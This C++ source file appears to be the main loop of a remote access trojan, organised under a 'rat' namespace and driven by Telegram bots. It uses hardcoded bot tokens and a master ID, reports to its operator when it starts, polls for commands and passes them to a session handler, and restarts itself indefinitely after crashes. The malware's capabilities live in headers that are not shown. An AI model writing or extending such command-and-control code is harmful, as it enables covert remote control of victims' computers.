#include "macro.hpp"
#include "rat/tbot/tbot.hpp"
#include "rat/Handler.hpp"
#include "logging.hpp"
#include <string>
#include <thread>
#include <chrono>
#include <array>
#include "rat/system.hpp"
#include <cmath>
#include <fmt/chrono.h>
#include <fmt/core.h>

static uint32_t empty_updates_count = 0;
static uint32_t sleep_timout_ms = 500;

std::string init_message = "";


static void botLoop(void);
static void invasiveBotLoop(void);
static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update);
static void _dynamicSleep(uint32_t arg_Count);

int main(void) {
    invasiveBotLoop();
    return 0;
}

static void invasiveBotLoop() {
    while (true) {

        try {
            botLoop();
        } catch (const std::exception& e) {
            init_message = fmt::format("Previous bot instance crashed: {}, restarting in 5s...", e.what());
            ERROR_LOG(init_message);
        } catch (...) {
            init_message = "Bot crashed due to unknown reason, restarting in 5s...";
            ERROR_LOG(init_message);
        }
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}

static void botLoop(void) {
    DEBUG_LOG("Bot constructing");
    rat::tbot::Bot     bot(TOKEN1_odahimbotzawzum, MASTER_ID);
    rat::tbot::BaseBot backing_bot(TOKEN_ODAHIMBOT , MASTER_ID, 60);
        
    if (init_message.empty()) {
        init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
    }

    bot.sendMessage(init_message);
    backing_bot.sendMessage(fmt::format("{} wait for the session handler to start", init_message));
    
    bot.setOffset();
    
    rat::handler::Handler session_handler(bot, backing_bot);
    
    while (true) {
        try {
            rat::tbot::Update update = bot.getUpdate();
            session_handler.handleUpdate(std::move(update));

            if(_isUpdateEmpty(update)) ++empty_updates_count;
          
            _dynamicSleep(empty_updates_count);
            std::this_thread::sleep_for(std::chrono::milliseconds(sleep_timout_ms));

        } catch (const std::exception& e) {
            ERROR_LOG("Error in bot loop: {}", e.what());
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
    }
}
static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
    return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
}

static void _dynamicSleep(uint32_t arg_Count) {
    const uint32_t base_sleep = 500;      // Base sleep in ms
    const double growth_factor = 1.001;    // 2% growth per empty update
    const uint32_t max_sleep = 5000;     // Cap at 5

    double sleep = base_sleep * std::pow(growth_factor, arg_Count);
    if (sleep > max_sleep) {
        sleep = max_sleep;
    }
    sleep_timout_ms = static_cast<uint32_t>(sleep);
}


